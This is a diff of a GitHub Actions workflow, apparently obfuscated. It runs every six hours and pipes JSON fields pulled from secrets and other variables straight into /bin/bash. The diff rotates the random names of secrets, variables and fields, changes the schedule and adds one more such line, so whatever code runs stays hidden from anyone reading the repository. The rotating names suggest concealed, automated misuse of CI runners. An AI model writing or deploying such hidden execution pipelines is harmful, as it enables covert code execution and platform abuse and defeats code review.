@@ -2,20 +2,21 @@ name: tulinglong4318
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
-jobs:  # 13154
+    - cron: '37 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tulinglong4318
         env:
-          cm4: ${{ secrets.cm4 }}
+          zfrt6: ${{ secrets.zfrt6 }}
         run: |
-          echo $cm4 | jq -r .pmp109 | /bin/bash
-          echo $s8 | jq -r .nrx8898 | /bin/bash
-          echo $e72163 | jq -r .ghsme63 | /bin/bash
-          echo $tgd1651 | jq -r .dyur6 | /bin/bash
-          echo $vyfri7 | jq -r .hoyxj4513 | /bin/bash
+          echo $zfrt6 | jq -r .bzwa87 | /bin/bash
+          echo $mt5 | jq -r .hmvrm3434 | /bin/bash
+          echo $imexr4359 | jq -r .imutn1 | /bin/bash
+          echo $tx6 | jq -r .a7 | /bin/bash
+          echo $jki4389 | jq -r .e73248 | /bin/bash
+          echo $hyo83 | jq -r .fwvdj68750 | /bin/bash
 
